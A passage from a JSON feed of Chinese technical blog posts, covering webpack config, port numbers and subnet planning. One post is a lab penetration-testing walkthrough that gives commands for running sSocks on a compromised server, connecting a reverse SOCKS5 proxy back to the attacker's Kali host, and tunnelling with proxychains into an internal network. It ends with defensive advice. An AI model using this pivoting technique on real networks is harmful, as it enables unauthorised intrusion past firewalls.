<span>}</span><span>,</span>\n                <span>{</span>\n                    <span>test</span><span>:</span> <span><span>/</span><span>\\.(sass|scss)$</span><span>/</span></span><span>,</span>\n                    <span>// exclude: /node_modules/,</span>\n                    <span>use</span><span>:</span> <span>[</span>\n\n                        <span>{</span>\n                            <span>loader</span><span>:</span> MiniCssExtractPlugin<span>.</span>loader\n                        <span>}</span><span>,</span>\n                        <span>{</span>\n                            <span>loader</span><span>:</span> <span>'css-loader'</span><span>,</span>\n                            <span>options</span><span>:</span> <span>{</span>\n                                <span>importLoaders</span><span>:</span> <span>2</span>\n                            <span>}</span>\n                        <span>}</span><span>,</span>\n                        <span>{</span>\n                            <span>loader</span><span>:</span> <span>'postcss-loader'</span><span>,</span>\n                            <span>options</span><span>:</span> <span>{</span>\n                                <span>plugins</span><span>:</span> <span>(</span><span>)</span> <span>=></span> <span>[</span>\n                                    <span>autoprefixer</span><span>(</span><span>{</span>\n                                        <span>browsers</span><span>:</span> <span>[</span>\n                                            <span>'ie >= 8'</span><span>,</span>\n                                            <span>'ie_mob >= 10'</span><span>,</span>\n                                            <span>'ff >= 26'</span><span>,</span>\n                                            <span>'chrome >= 20'</span><span>,</span>\n                                            <span>'safari >= 6'</span><span>,</span>\n                                            <span>'opera >= 12'</span><span>,</span>\n                                            <span>'Firefox >= 24'</span><span>,</span>\n                                            <span>'Explorer >= 8'</span><span>,</span>\n                                            <span>'ios >= 5'</span><span>,</span>\n                                            <span>'android >= 2.3'</span><span>,</span>\n                                            <span>'bb >= 10'</span><span>,</span>\n                                            <span>'last 1 version'</span>\n                                        <span>]</span>\n                                    <span>}</span><span>)</span>\n                                <span>]</span>\n                            <span>}</span>\n                        <span>}</span><span>,</span>\n                        <span>{</span>\n                            <span>loader</span><span>:</span> <span>'sass-loader'</span>\n                        <span>}</span>\n\n                    <span>]</span>\n                <span>}</span><span>,</span>\n                <span>{</span>\n                    <span>test</span><span>:</span> <span><span>/</span><span>\\.(jpg|png|gif|jpeg|woff|woff2|svg|ttf|eot)$</span><span>/</span></span><span>,</span>\n                    <span>use</span><span>:</span> <span>[</span>\n\n                        <span>{</span>\n                            <span>loader</span><span>:</span> <span>'url-loader'</span><span>,</span>\n                            <span>options</span><span>:</span> <span>{</span>\n                                <span>limit</span><span>:</span> <span>8192</span><span>,</span>\n                                <span>name</span><span>:</span> <span>'images/[name]-[hash:32].[ext]'</span>\n                            <span>}</span>\n                        <span>}</span>\n\n                    <span>]</span>\n                <span>}</span><span>,</span>\n                <span>{</span>\n                    <span>test</span><span>:</span> <span><span>/</span><span>\\.html$</span><span>/</span></span><span>,</span>\n                    <span>loader</span><span>:</span> <span>'html-withimg-loader'</span>\n                <span>}</span><span>,</span>\n                <span>{</span>\n                    <span>test</span><span>:</span> <span><span>/</span><span>\\.(woff|woff2|svg|ttf|eot)$</span><span>/</span></span><span>,</span>\n                    <span>use</span><span>:</span> <span>[</span>\n\n                        <span>{</span>\n                            <span>loader</span><span>:</span> <span>'file-loader'</span><span>,</span>\n                            <span>options</span><span>:</span> <span>{</span>\n                                <span>name</span><span>:</span> <span>'fonts/[name].[hash:8].[ext]'</span>\n                            <span>}</span>\n                        <span>}</span> <span>// 项目设置打包到dist下的fonts文件夹下</span>\n\n                    <span>]</span>\n                <span>}</span>\n            <span>]</span>\n        <span>}</span><span>,</span>\n        <span>plugins</span><span>:</span> <span>[</span>\n            <span>new</span> <span>HtmlWebpackPlugin</span><span>(</span><span>{</span>\n                <span>minify</span><span>:</span> <span>{</span>\n                    <span>removeAttributeQuotes</span><span>:</span> <span>true</span> <span>// 去掉属性值后的双引号</span>\n                <span>}</span><span>,</span>\n                <span>hash</span><span>:</span> <span>true</span><span>,</span>\n                <span>template</span><span>:</span> <span>'./src/index.html'</span><span>,</span>\n                <span>inject</span><span>:</span> <span>'body'</span>\n            <span>}</span><span>)</span><span>,</span>\n            <span>new</span> <span>CleanWebpackPlugin</span><span>(</span><span>[</span><span>'dist'</span><span>]</span><span>)</span><span>,</span>\n            <span>new</span> <span>MiniCssExtractPlugin</span><span>(</span><span>{</span>\n                <span>filename</span><span>:</span> <span>'css/[name]-[hash:32].css'</span>\n            <span>}</span><span>)</span><span>,</span>\n            <span>new</span> <span>OptimizeCssAssetsPlugin</span><span>(</span><span>{</span>\n                <span>assetNameRegExp</span><span>:</span> <span><span>/</span><span>\\.css$</span><span>/</span><span>g</span></span><span>,</span>\n                <span>cssProcessor</span><span>:</span> <span>require</span><span>(</span><span>'cssnano'</span><span>)</span><span>,</span>\n                <span>cssProcessorOptions</span><span>:</span> <span>{</span>\n                    <span>safe</span><span>:</span> <span>true</span><span>,</span>\n                    <span>discardComments</span><span>:</span> <span>{</span>\n                        <span>removeAll</span><span>:</span> <span>true</span>\n                    <span>}</span>\n                <span>}</span><span>,</span>\n                <span>canPrint</span><span>:</span> <span>true</span>\n            <span>}</span><span>)</span><span>,</span>\n            <span>new</span> <span>OpenBrowserPlugin</span><span>(</span><span>{</span>\n                <span>url</span><span>:</span> <span>'http://localhost:3000'</span>\n            <span>}</span><span>)</span><span>,</span>\n            <span>new</span> <span>CompressionWebpackPlugin</span><span>(</span><span>{</span>\n                <span>test</span><span>:</span> <span>new</span> <span>RegExp</span><span>(</span><span>'\\\\.('</span> <span>+</span> productionGzipExtensions<span>.</span><span>join</span><span>(</span><span>'|'</span><span>)</span> <span>+</span> '<span>)</span><span>)</span><span>,</span>\n                    <span>threshold</span><span>:</span> <span>8192</span><span>,</span>\n                    <span>minRatio</span><span>:</span> <span>0.8</span>\n                <span>}</span><span>)</span><span>]</span><span>,</span>\n            <span>devServer</span><span>:</span> <span>{</span>\n                <span>contentBase</span><span>:</span> path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>'dist'</span><span>)</span><span>,</span>\n                <span>compress</span><span>:</span> <span>true</span><span>,</span>\n                <span>port</span><span>:</span> <span>3000</span>\n            <span>}</span>\n        <span>}</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>",
      "date_published": "2018-11-16T14:25:54.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "manual"
      ]
    },
    {
      "title": "常见的端口号以及其对应的应用程序或服务",
      "url": "https://vxhly.github.io/views/networking/common-port.html",
      "id": "https://vxhly.github.io/views/networking/common-port.html",
      "summary": "前言\n列出 TCP/UDP 协议常见的端口号占用情况, 以助于分析该服务器开放了哪些端口号, 或者程序占用了哪些端口号。\n\n",
      "content_html": "<div><p>前言</p>\n<p>列出 TCP/UDP 协议常见的端口号占用情况, 以助于分析该服务器开放了哪些端口号, 或者程序占用了哪些端口号。</p>\n</div>\n\n<h2 id=\"如何查看\" tabindex=\"-1\"> 如何查看</h2>\n<h3 id=\"windows-系统\" tabindex=\"-1\"> Windows 系统</h3>\n<p>通过 <code>netstat</code> 列出所有端口的使用情况, <code>For Example:</code></p>\n<div><pre><code><span>netstat</span> -ano\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>通过 <code>findstr</code> 查询包含关键字的端口使用情况, <code>For Example:</code></p>\n<div><pre><code>netsata -ano <span>|</span> findstr <span>\":80\"</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>通过 <code>tasklist</code> 查询哪个程序或应用占用该端口对应的 <code>PID</code> , <code>For Example:</code></p>\n<div><pre><code>tasklist <span>|</span> findstr <span>\"2180\"</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"liunx-系统\" tabindex=\"-1\"> Liunx 系统</h3>\n<p>通过 <code>netstat</code> 列出监听的端口, <code>For Example:</code></p>\n<div><pre><code><span>netstat</span> -tlun\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>通过 <code>netstat</code> 列出所有的网络连接, <code>For Example:</code></p>\n<div><pre><code><span>netstat</span> -an\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>通过 <code>ps</code> 查看进程占用状态, <code>For Example:</code></p>\n<div><pre><code><span>ps</span> -ef <span>|</span> <span>grep</span> sshd\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h2 id=\"常见端口号\" tabindex=\"-1\"> 常见端口号</h2>\n<h3 id=\"tcp-协议相关\" tabindex=\"-1\"> TCP 协议相关</h3>\n<ul>\n<li><code>20</code> =&gt; FTP（文件传输协议） 传输数据端口, 用于纯属数据</li>\n<li><code>21</code> =&gt; FTP（文件传输协议） 连接端口, 用于登陆认证</li>\n<li><code>22</code> =&gt; SSH（安全外壳协议） 加密的远程连接, SFTP（安全的文件传输协议） 传输安全的数据</li>\n<li><code>23</code> =&gt; Telnet（远程终端协议） 相对不安全的远程连接</li>\n<li><code>25</code> =&gt; SMTP（简单邮件传输协议） 使用的端口</li>\n<li><code>53</code> =&gt; DNS 服务器开放的端口, 入侵者可能是试图进行区域传递（TCP）, 所以防火墙常常过滤或记录该端口</li>\n<li><code>80</code> / <code>8080</code> / <code>3128</code> / <code>8081</code> / <code>9080</code> =&gt; HTTP（超文本传输协议） 使用的端口</li>\n<li><code>109</code> =&gt; POP2（邮件协议 2） 服务器开放的端口</li>\n<li><code>110</code> =&gt; POP3（邮件协议 3） 服务器开放的端口, 用于接收邮件, 客户端访问服务器的邮件服务</li>\n<li><code>139</code> =&gt; 文件共享使用的端口</li>\n<li><code>443</code> =&gt; HTTPS（安全套接字层的超文本传输协议） 默认端口, 传输数据更加安全</li>\n<li><code>445</code> =&gt; SMB（文件共享服务）开放的端口</li>\n<li><code>1433</code> =&gt; SQL Server 默认的端口, 用于供 SQL Server 对外提供服务</li>\n<li><code>1521</code> =&gt; Oracle 数据库默认端口</li>\n<li><code>3306</code> =&gt; MySQL 数据库默认端口</li>\n<li><code>3389</code> =&gt; 远程桌面使用的端口</li>\n<li><code>8080</code> =&gt; Tomcat 服务器的默认端口</li>\n</ul>\n<h3 id=\"udp-协议相关\" tabindex=\"-1\"> UDP 协议相关</h3>\n<ul>\n<li><code>53</code> =&gt; DNS 服务器开放的端口, 入侵者可能是试图进行欺骗 DNS（UDP）或隐藏其他的通信, 所以防火墙常常过滤或记录该端口</li>\n<li><code>69</code> =&gt; TFTP（简单文件传输协议） 默认的端口号</li>\n<li><code>139</code> =&gt; 文件共享使用的端口</li>\n<li><code>161</code> =&gt; SNMP（简单网络管理协议） 入侵者常探测的端口</li>\n<li><code>162</code> =&gt; SNMP（简单网络管理协议） 默认的端口号</li>\n<li><code>445</code> =&gt; SMB（文件共享服务）开放的端口</li>\n<li><code>1434</code> =&gt; SQL Server 默认的端口, 于向请求者返回 SQL Server 使用了哪个 TCP/IP 端口</li>\n</ul>\n",
      "date_published": "2016-08-16T16:04:29.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "networking"
      ]
    },
    {
      "title": "IP 地址规划",
      "url": "https://vxhly.github.io/views/networking/ip-address-planning.html",
      "id": "https://vxhly.github.io/views/networking/ip-address-planning.html",
      "summary": "前言\n当申请到一个 C 类网络地址时, 很多时候需要对其子网划分, 那么一个高效简便的子网划分方法由此而生。\n\n",
      "content_html": "<div><p>前言</p>\n<p>当申请到一个 C 类网络地址时, 很多时候需要对其子网划分, 那么一个高效简便的子网划分方法由此而生。</p>\n</div>\n\n<h2 id=\"先分清五类网络地址\" tabindex=\"-1\"> 先分清五类网络地址</h2>\n<p>IP 地址分为 A, B, C, D, E 五类</p>\n<ul>\n<li>网络号: 用于识别主机所在的网络</li>\n<li>主机号: 用于识别该网络中的主机</li>\n</ul>\n<p>其中 A 类分配给政府机关使用, B 类地址给大中型企业使用, C 类地址给个人使用。这三种是主要的。</p>\n<p>D 类用于组播, E 类用于实验, 各类可容纳的地址数目不同。</p>\n<p>其中 A 类、B 类、C 类这三类地址用于 <code>TCP/IP</code> 节点。其它两类 D 类和 E 类被用于特殊用途。</p>\n<p>A、B、C 三类 IP 地址的特征: 当将 IP 地址写成二进制形式时, A 类地址的第一位总是 O, B 类地址的前两位总是 10, C 类地址的前三位总是 <code>110</code> 。</p>\n<h3 id=\"a-类地址\" tabindex=\"-1\"> A 类地址</h3>\n<ul>\n<li>A 类地址第 1 字节为网络地址, 其它 3 个字节为主机地址</li>\n<li>A 类地址范围: <code>1.0.0.1</code> -- <code>126.255.255.254</code></li>\n<li>A 类地址中的私有地址和保留地址（所谓的私有地址就是在互联网上不使用, 而被用在局域网络中的地址；保留地址则不被分配。）</li>\n</ul>\n<p>-- <code>10.X.X.X</code> 是私有地址 -- <code>127.X.X.X</code> 是保留地址, 用做循环测试用的</p>\n<ul>\n<li>最大的网络数: <code>2^7-2</code> , 网络中最大的主机数: <code>2^24-2</code></li>\n</ul>\n<h3 id=\"b-类地址\" tabindex=\"-1\"> B 类地址</h3>\n<ul>\n<li>B 类地址第 1 字节和第 2 字节为网络地址, 其它 2 个字节为主机地址</li>\n<li>B 类地址范围: <code>128.0.0.1</code> -- <code>191.255.255.254</code></li>\n<li>B 类地址的私有地址和保留地址</li>\n</ul>\n<p>-- <code>172.16.0.0</code> -- <code>172.31.255.255</code> 是私有地址 -- <code>169.254.X.X</code> 是保留地址。如果你的 IP 地址是自动获取 IP 地址, 而你在网络上又没有找到可用的 DHCP 服务器。就会得到其中一个 IP</p>\n<ul>\n<li>最大的网络数: <code>2^14-2</code> , 网络中最大的主机数: <code>2^16-2</code></li>\n</ul>\n<h3 id=\"c-类地址\" tabindex=\"-1\"> C 类地址</h3>\n<ul>\n<li>C 类地址第 1 字节、第 2 字节和第 3 个字节为网络地址, 第 4 个个字节为主机地址。另外第 1 个字节的前三位固定为 <code>110</code></li>\n<li>C 类地址范围: <code>192.0.0.1</code> -- <code>223.255.255.254</code></li>\n<li>C 类地址中的私有地址:</li>\n</ul>\n<p>-- <code>192.168.X.X</code> 是私有地址</p>\n<ul>\n<li>最大的网络数: <code>2^21-2</code> , 网络中最大的主机数: <code>2^8-2</code></li>\n</ul>\n<h3 id=\"d-类地址\" tabindex=\"-1\"> D 类地址</h3>\n<ul>\n<li>D 类地址不分网络地址和主机地址, 它的第 1 个字节的前四位固定为 <code>1110</code></li>\n<li>D 类地址范围: <code>224.0.0.1</code> -- <code>239.255.255.254</code></li>\n</ul>\n<h3 id=\"e-类地址\" tabindex=\"-1\"> E 类地址</h3>\n<ul>\n<li>E 类地址也不分网络地址和主机地址, 它的第 1 个字节的前五位固定为 <code>11110</code></li>\n<li>E 类地址范围: <code>240.0.0.1</code> -- <code>255.255.255.254</code></li>\n</ul>\n<h2 id=\"c-类-ip-地址规划\" tabindex=\"-1\"> C 类 IP 地址规划</h2>\n<h3 id=\"首先-准确的记住-2-1-2-8-的得数\" tabindex=\"-1\"> 首先, 准确的记住 2^1 ~ 2^8 的得数</h3>\n<div><pre><code>2^1 = 2\n2^2 = 4\n2^3 = 8\n2^4 = 16\n2^5 = 32\n2^6 = 64\n2^7 = 128\n2^8 = 256\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"地址划分\" tabindex=\"-1\"> 地址划分</h3>\n<p>划分时要么根据主机数来划分；要么根据子网数来划分。</p>\n<h4 id=\"第一种情况\" tabindex=\"-1\"> 第一种情况</h4>\n<p>已知 IP 地址段和子网个数, 求子网的规划</p>\n<div><pre><code>已知,某公司总部申请到 200.200.200.0 网段,该公司总部有三个部门。\n每个部门都将拥有属于该部门的子网,写出每个部门将会分配到的IP地址段（包含网络地址和广播地址）。\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>解析: 要划分 3 个子网, 那么 2^n&gt;=3 , 得出 n&gt;=2 , 取 n=2 , 即 2^2=4 , 可以划分四个子网。每个子网有 2^(8-2)-2=62 个主机。广播号等于网络号加 (2^(8-2)-1), 子网掩码为 24+2=26。</p>\n<p><code>答案: </code></p>\n<div><pre><code>四个子网分别是:\n\nA: 200.200.200.0/26 ~ 200.200.200.63/26\nB: 200.200.200.64/26 ~ 200.200.200.127/26\nC: 200.200.200.128/26 ~ 200.200.200.191/26\nD: 200.200.200.192/26 ~ 200.200.200.255/26\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id=\"第二种情况\" tabindex=\"-1\"> 第二种情况</h4>\n<p>已知 IP 地址段和各子网的主机个数, 求子网规划</p>\n<div><pre><code>已知,某公司总部申请到 200.200.200.0 网段,该公司总部有三个部门,\n分别是 A 部们、B 部门、 C 部门,\n其中 A 部门有 100 台电脑,B 部门有 48 台电脑,C 部门有 50 台电脑,\n写出每个部门将会分配到的 IP 地址段（包含网络地址和广播地址）。\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><p>解析: 要划分 3 个子网, 第一个子网有 100 台主机, 那么 2^n&gt;=100, 得出 n&gt;=7, 则该子网总共能容纳主机数为 2^7-2=126。广播号等于网络号加上 (2^7-1), 该子网的掩码为 32-7=25。以此类推。</p>\n<p><code>答案: </code></p>\n<div><pre><code>三个子网分别是:\n\nA: 200.200.200.0/25 ~ 200.200.200.127/25\nB: 200.200.200.128/26 ~ 200.200.200.191/26\nC: 200.200.200.192/26 ~ 200.200.200.255/26\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div></div></div><h3 id=\"ip-地址规划练习\" tabindex=\"-1\"> IP 地址规划练习</h3>\n<div><pre><code>已知, 某公司总部申请到 211.91 .5 .0 网段, 该公司总部有六个部门,\n每个部门对应的电脑台数分别是 A 部门 100 台、 B 部门 50 台、 C 部门 10 台、 E 部门 10 台、 F 部门 10 台。\n写出每个部门将会分配到的 IP 地址段（ 包含网络地址和广播地址）。\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><p>解析: 要划分 6 个子网, 第一个子网有 100 台主机, 那么 2^n&gt;=100, 得出 n&gt;=7, 则该子网总共能容纳主机数为 2^7-2=126。广播号等于网络号加上 (2^7-1), 该子网的掩码为 32-7=25。以此类推。</p>\n<p><code>答案: </code></p>\n<div><pre><code>六个子网分别是:\n\nA: 211.91.5.0/25 ~ 211.91.5.127/25\nB: 211.91.5.128/26 ~ 211.91.5.191/26\nC: 211.91.5.192/28 ~ 211.91.5.207/28\nD: 211.91.5.208/28 ~ 211.91.5.223/28\nE: 211.91.5.224/28 ~ 211.91.5.239/28\nF: 211.91.5.240/28 ~ 211.91.5.255/28\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>",
      "date_published": "2016-09-11T21:49:24.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "networking"
      ]
    },
    {
      "title": "Socks 代理反弹突破内网",
      "url": "https://vxhly.github.io/views/networking/socks-proxy-rebound.html",
      "id": "https://vxhly.github.io/views/networking/socks-proxy-rebound.html",
      "summary": "前言\n对于渗透测试者来说, 如何绕过防火墙的阻挡在内网展开渗透测试成为需解决的问题, 本文介绍了在夺取映射到外网的内网服务器权限后, 如何利用 Socks 代理反弹获得内网访问权限。\n\n",
      "content_html": "<div><p>前言</p>\n<p>对于渗透测试者来说, 如何绕过防火墙的阻挡在内网展开渗透测试成为需解决的问题, 本文介绍了在夺取映射到外网的内网服务器权限后, 如何利用 Socks 代理反弹获得内网访问权限。</p>\n</div>\n\n<h2 id=\"环境介绍\" tabindex=\"-1\"> 环境介绍</h2>\n<table>\n<thead>\n<tr>\n<th>机子</th>\n<th>系统</th>\n<th>IP</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>攻击机</td>\n<td><code>kali Liunx</code></td>\n<td>192.168.199.130 (外网)</td>\n</tr>\n<tr>\n<td>目标主机</td>\n<td><code>ubuntu-server</code></td>\n<td>192.168.199.131 (外网)；192.168.235.143 (内网)</td>\n</tr>\n<tr>\n<td>内网主机</td>\n<td><code>Metasploitable2-Liunx</code></td>\n<td>192.168.235.142 (内网)</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"工具介绍\" tabindex=\"-1\"> 工具介绍</h2>\n<h3 id=\"ssocks\" tabindex=\"-1\"> sSocks</h3>\n<p>sSocks 是一个 socks 代理工具套装, 可用来开启 socks 代理服务, 支持 socks5 验证, 支持 IPV6 和 UDP, 并提供反向 socks 代理服务, 即将远程计算机作为 socks 代理服务端, 反弹回本地, 极大方便内网的渗透测试</p>\n<h3 id=\"下载\" tabindex=\"-1\"> 下载</h3>\n<p><a href=\"http://sourceforge.net/projects/ssocks/\" target=\"_blank\" rel=\"noopener noreferrer\">sSocks 更新地址</a><br> 这里下载的版本为 <code>0.0.14</code></p>\n<div><pre><code><span>wget</span> https://nchc.dl.sourceforge.net/project/ssocks/ssocks-0.0.14.tar.gz\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"解压并编译\" tabindex=\"-1\"> 解压并编译</h3>\n<div><pre><code><span>tar</span> -xzvf ssocks-0.0.14.tar.gz\n<span>cd</span> ssocks-0.0.14\n./configure <span>&amp;&amp;</span> <span>make</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><div><p>注意</p>\n<p>编译的时候要先确定机子上有 gcc 环境, 没有的请自行安装</p>\n</div>\n<h3 id=\"功能\" tabindex=\"-1\"> 功能</h3>\n<p>编译完成, 进入 sr c 目录, 会发现有 <code>nsocks</code> 、 <code>ssocksd</code> 、 <code>ssocks</code> 、 <code>rcsocks</code> , 其功能说明介绍如下:</p>\n<ul>\n<li><strong>nsocks</strong> 类似通过 Socks5 代理后的 netcat, 可用来测试 socks server</li>\n<li><strong>ssocksd</strong> 用来开启 Socks5 代理服务</li>\n<li><strong>ssocks</strong> 本地启用 Socks5 服务, 并反弹到另一 IP 地址</li>\n<li><strong>rcsocks</strong> 接收反弹过来的 Socks5 服务, 并转向另一端口</li>\n</ul>\n<h2 id=\"攻击步骤\" tabindex=\"-1\"> 攻击步骤</h2>\n<p>现假设已获得 <code>ubuntu-server</code> 权限, 也将 ssocks 这软件上传至该服务器（包含解压和编译）</p>\n<h3 id=\"执行本地监听\" tabindex=\"-1\"> 执行本地监听</h3>\n<p>机子: <code>kali Liunx</code> ；IP: <code>192.168.199.130</code></p>\n<div><pre><code><span>cd</span> ssocks-0.0.14/src\n./rcsocks -l <span>1088</span> -p <span>1080</span> -vv\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>等待远程 Socks5 服务器访问本地 1080 端口, 创建端口 1080 与本地端口 1088 的连接通道<br></p>\n<p><img src=\"/assets/socks-proxy-1.png\" alt=\"Socks 代理\"></p>\n<h3 id=\"开启-socks5-代理服务-反弹\" tabindex=\"-1\"> 开启 Socks5 代理服务, 反弹</h3>\n<p>机子: <code>ubuntu-server</code> ；IP: <code>192.168.199.131</code></p>\n<div><pre><code><span>cd</span> ssocks-0.0.14/src\n./rssocks -vv -s <span>192.168</span>.199.130:1080\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>启用 Socks5 服务, 反弹到 <code>192.168.199.130</code> （即 <code>kali Liunx</code> ） 的端口 1080 上<br></p>\n<p><img src=\"/assets/socks-proxy-2.png\" alt=\"Socks 代理\"></p>\n<p>此时在渗透测试端 <code>192.168.199.130</code> （即 <code>kali Liunx</code> ） 可看到通道连接成功<br></p>\n<p><img src=\"/assets/socks-proxy-3.png\" alt=\"Socks 代理\"></p>\n<h3 id=\"利用-proxychains-进行-socks5-代理\" tabindex=\"-1\"> 利用 proxychains 进行 Socks5 代理</h3>\n<p>机子: <code>kali Liunx</code> ；IP: <code>192.168.199.130</code></p>\n<h4 id=\"proxychains-介绍\" tabindex=\"-1\"> proxychains 介绍</h4>\n<p>通过前面的步骤, Socks5 代理已创建完成了。由于在渗透测试过程中, 需要使用不同的工具程序, 而在各程序中分别配置 Socks5 代理信息较为繁琐, 而部分程序并不支持配置 Socks5 代理。为了简化这些操作, 我们可以采用 <code>proxychains</code> 。</p>\n<p>proxychains 是一个代理客户端软件, 可以支持几乎所有程序的代理, 如 <code>ssh</code> , <code>telnet</code> , <code>ftp</code> 等。利用 <code>proxychains</code> , 程序能在代理的环境下被加载运行, 而本身不需要具备代理功能。</p>\n<h4 id=\"proxychains-下载\" tabindex=\"-1\"> proxychains 下载</h4>\n<p>需要 git 环境, 在 <code>kali Liunx</code> 使用 <code>proxychains</code></p>\n<div><pre><code><span>git</span> clone https://github.com/haad/proxychains.git\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"编译和安装\" tabindex=\"-1\"> 编译和安装</h4>\n<div><pre><code><span>cd</span> proxychains\n./configure\n<span>make</span> <span>&amp;&amp;</span> <span>make</span> <span>install</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div></div></div><h4 id=\"修改配置文件\" tabindex=\"-1\"> 修改配置文件</h4>\n<p>使用前需要对 proxychains 进行简单配置, 打开配置文件 <code>/etc/proxychains.conf</code> 在 <code>[ProxyList]</code> 处添加</p>\n<div><pre><code>socks5 <span>127.0</span>.0.1 <span>1088</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/socks-proxy-4.png\" alt=\"Socks 代理\"></p>\n<p>配置成功后若要启动程序, 仅需要在启动程序命令前加上 <code>proxychains</code></p>\n<h3 id=\"启用浏览器-firefox\" tabindex=\"-1\"> 启用浏览器 firefox</h3>\n<p>机子: <code>kali Liunx</code> ；IP: <code>192.168.199.130</code></p>\n<div><pre><code>proxychains firefox\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/socks-proxy-5.png\" alt=\"Socks 代理\"></p>\n<h3 id=\"访问内网机子\" tabindex=\"-1\"> 访问内网机子</h3>\n<p>机子: <code>kali Liunx</code> ；IP: <code>192.168.235.143</code></p>\n<div><p>注意</p>\n<p>现在已经可以直接访问内网主机了, IP: <code>192.168.235.142</code></p>\n</div>\n<p><img src=\"/assets/socks-proxy-6.png\" alt=\"Socks 代理\"></p>\n<p>随便点个链接, 然后再看一眼 <code>ubuntu-server</code> 中的日志, 成功访问到内网中的页面<br></p>\n<p><img src=\"/assets/socks-proxy-7.png\" alt=\"Socks 代理\"></p>\n<h2 id=\"后记\" tabindex=\"-1\"> 后记</h2>\n<p>由于系统管理员的疏忽或者业务需求所致, 防火墙一般仅对由外向内发起的数据连接进行严格判断、过滤、甚至阻断而忽略由内往外的连接。因此, 在此种情况下, 通过攻陷映射到公网的端口服务, 利用反弹便可获取内网访问权限, 给内网安全带来极大的威胁。在信息安全建设与运维过程中, 不仅要加强映射到公网的服务安全, 也要重视由内到外连接的安全威胁 � 维过程中, 不仅要加强映射到公网的服务安全, 也要重视由内到外连接的安全威胁</p>\n",
      "image": "https://vxhly.github.io/assets/socks-proxy-1.png",
      "date_published": "2016-11-24T14:46:22.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "networking"
      ]
    },
    {
      "title": "Ubuntu 下连接 WIFI",
      "url": "https://vxhly.github.io/views/networking/ubuntu-connect-wifi.html",
      "id": "https://vxhly.github.io/views/networking/ubuntu-connect-wifi.html",
      "summary": "前言\n基于已经安装双系统, 或是只有 Ubuntu 系统, 在虚拟机下不存在此问题。\n\n",
